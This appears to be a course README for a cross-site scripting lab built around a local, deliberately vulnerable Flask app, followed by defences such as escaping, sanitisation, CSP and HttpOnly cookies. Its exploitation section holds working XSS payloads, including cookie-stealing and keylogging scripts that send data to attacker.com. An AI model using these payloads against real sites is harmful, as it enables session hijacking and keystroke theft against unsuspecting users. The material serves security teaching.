# Lab 2: XSS (Cross-Site Scripting) Attacks

## Overview

Cross-Site Scripting (XSS) is one of the most common web vulnerabilities that allows attackers to inject malicious scripts into web pages viewed by other users. This lab teaches you to identify, exploit, and prevent XSS attacks.

## Learning Objectives

By the end of this lab, you will:
- Understand different types of XSS (Stored, Reflected, DOM-based)
- Identify vulnerable code patterns
- Exploit XSS vulnerabilities safely
- Implement proper defenses (escaping, sanitization, CSP)
- Understand Content Security Policy (CSP)

## Prerequisites

- Basic understanding of HTML/JavaScript
- Python 3.7+
- Flask installed (`pip install flask markupsafe bleach`)

## Lab Structure

```
lab2-xss-attacks/
├── README.md (this file)
├── vulnerable_app.py (intentionally vulnerable)
├── fixed_app.py (secure implementation)
├── exploit_examples.html (demonstration attacks)
├── test_security.py (validation tests)
└── templates/ (HTML templates)
```

## Setup

1. **Install dependencies:**
   ```bash
   pip install flask markupsafe bleach
   ```

2. **Start the vulnerable application:**
   ```bash
   python3 vulnerable_app.py
   ```

   Server runs on `http://localhost:5003`

## Part 1: Understanding XSS

### What is XSS?

XSS occurs when:
1. Application includes untrusted data in a web page
2. Data is not properly validated or escaped
3. Malicious scripts execute in victim's browser
4. Attacker can steal cookies, session tokens, or perform actions as the victim

### Types of XSS

#### 1. **Stored XSS (Persistent)**
- Malicious script is stored in database
- Executes when any user views the data
- Most dangerous type
- Example: Malicious comment on a blog

#### 2. **Reflected XSS (Non-Persistent)**
- Malicious script is in URL/request
- Executes immediately in response
- Requires victim to click malicious link
- Example: Search query reflected in results

#### 3. **DOM-based XSS**
- Vulnerability is in client-side JavaScript
- Server-side code may be secure
- DOM manipulation with untrusted data
- Example: Reading URL parameters and inserting into page

## Part 2: Exploitation Examples

### Attack 1: Stored XSS (Comment System)

**Objective:** Store malicious script in comments

**Payload:**
```html
<script>alert('XSS')</script>
```

**Attack:**
```bash
curl -X POST http://localhost:5003/api/comment \
  -H "Content-Type: application/json" \
  -d '{"name": "Attacker", "text": "<script>alert(\"XSS\")</script>"}'
```

**Result:** Script executes when anyone views the comments page

### Attack 2: Reflected XSS (Search)

**Objective:** Execute script via URL parameter

**Payload:**
```
http://localhost:5003/search?q=<script>alert('XSS')</script>
```

**Result:** Script executes immediately in search results

### Attack 3: Cookie Stealing

**Objective:** Steal user's session cookie

**Payload:**
```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**Result:** User's cookies sent to attacker's server

### Attack 4: Keylogging

**Objective:** Capture user keystrokes

**Payload:**
```html
<script>
  document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key)
  }
</script>
```

### Attack 5: Defacement

**Objective:** Change page content

**Payload:**
```html
<script>
  document.body.innerHTML = '<h1>Hacked!</h1>'
</script>
```

## Part 3: Testing Vulnerabilities

Open the vulnerable app and try:

1. **Basic Alert:**
   ```html
   <script>alert('XSS')</script>
   ```

2. **Image tag with onerror:**
   ```html
   <img src=x onerror="alert('XSS')">
   ```

3. **Event handler:**
   ```html
   <button onclick="alert('XSS')">Click me</button>
   ```

4. **SVG payload:**
   ```html
   <svg onload="alert('XSS')">
   ```

5. **Iframe injection:**
   ```html
   <iframe src="javascript:alert('XSS')"></iframe>
   ```

## Part 4: Implementing Fixes

### Defense 1: Output Encoding/Escaping

**Escape HTML special characters:**
```python
from markupsafe import escape

# BEFORE (Vulnerable):
html = f"<p>{user_input}</p>"

# AFTER (Secure):
html = f"<p>{escape(user_input)}</p>"
```

**What happens:**
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`
- `'` becomes `&#x27;`
- Scripts rendered as text, not executed

### Defense 2: Input Sanitization

**Remove dangerous HTML:**
```python
import bleach

# Allow only safe tags and attributes
allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'a']
allowed_attrs = {'a': ['href', 'title']}

clean_text = bleach.clean(
    user_input,
    tags=allowed_tags,
    attributes=allowed_attrs,
    strip=True
)
```

### Defense 3: Content Security Policy (CSP)

**Add security headers:**
```python
@app.after_request
def add_security_headers(response):
    # Prevent inline scripts and unsafe-eval
    response.headers['Content-Security-Policy'] = \
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    
    # Additional security headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    
    return response
```

**CSP Directives:**
- `default-src 'self'` - Only load resources from same origin
- `script-src 'self'` - Only load scripts from same origin
- `script-src 'nonce-xyz'` - Allow scripts with specific nonce
- `script-src 'unsafe-inline'` - Allow inline scripts (AVOID!)

### Defense 4: HTTPOnly Cookies

**Prevent JavaScript access to cookies:**
```python
response.set_cookie(
    'session_id',
    value=session_token,
    httponly=True,  # Prevents JS access
    secure=True,    # Only send over HTTPS
    samesite='Strict'  # CSRF protection
)
```

### Defense 5: Use Templating Engines

**Jinja2 auto-escapes by default:**
```python
from flask import render_template

# Secure - automatic escaping
return render_template('comments.html', comments=comments)
```

```html
<!-- Template: comments.html -->
{% for comment in comments %}
  <p>{{ comment.text }}</p>  <!-- Auto-escaped! -->
{% endfor %}
```

## Part 5: Testing Your Fix

1. **Start the fixed application:**
   ```bash
   python3 fixed_app.py
   ```

2. **Run security tests:**
   ```bash
   python3 test_security.py
   ```

3. **Verify protections:**
   - XSS payloads displayed as text
   - CSP headers present
   - HTTPOnly cookies set
   - No script execution

## Part 6: Best Practices Summary

### ✅ DO:
- Escape all untrusted data before inserting into HTML
- Use templating engines with auto-escaping (Jinja2, React, Vue)
- Implement Content Security Policy (CSP)
- Set HTTPOnly and Secure flags on cookies
- Sanitize HTML if you must allow some HTML tags
- Validate input on both client and server
- Use modern frameworks with built-in XSS protection

### ❌ DON'T:
- Insert untrusted data directly into HTML
- Trust user input without validation/escaping
- Use `innerHTML` with untrusted data
- Disable CSP or use `unsafe-inline`
- Allow all HTML tags without sanitization
- Rely solely on client-side filtering
- Use `eval()` or `Function()` with user data

## Context-Specific Escaping

Different contexts require different escaping:

| Context | Escape Method | Example |
|---------|---------------|---------|
| HTML Body | HTML encode | `<p>${escape(data)}</p>` |
| HTML Attribute | Attribute encode | `<div title="${escape(data)}">` |
| JavaScript | JavaScript encode | `var x = "${jsEncode(data)}"` |
| URL | URL encode | `<a href="/page?q=${urlEncode(data)}">` |
| CSS | CSS encode | `style="${cssEncode(data)}"` |

## Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)

## Challenge Exercises

1. **Find all XSS:** Identify every XSS vulnerability in vulnerable_app.py
2. **Bypass filters:** Try to bypass a simple blacklist filter
3. **CSP bypass:** Research ways CSP can be misconfigured
4. **DOM XSS:** Create a DOM-based XSS example
5. **Context awareness:** Try XSS in different HTML contexts

## Next Steps

After completing this lab:
- Move to [Lab 3: Broken Authentication](../lab3-broken-authentication/)
- Review [API Security Module](../../09-API-Security/)
- Learn about CSRF (Cross-Site Request Forgery)

---

**⚠️ Warning:** The vulnerable code is for educational purposes only. Never use in production!
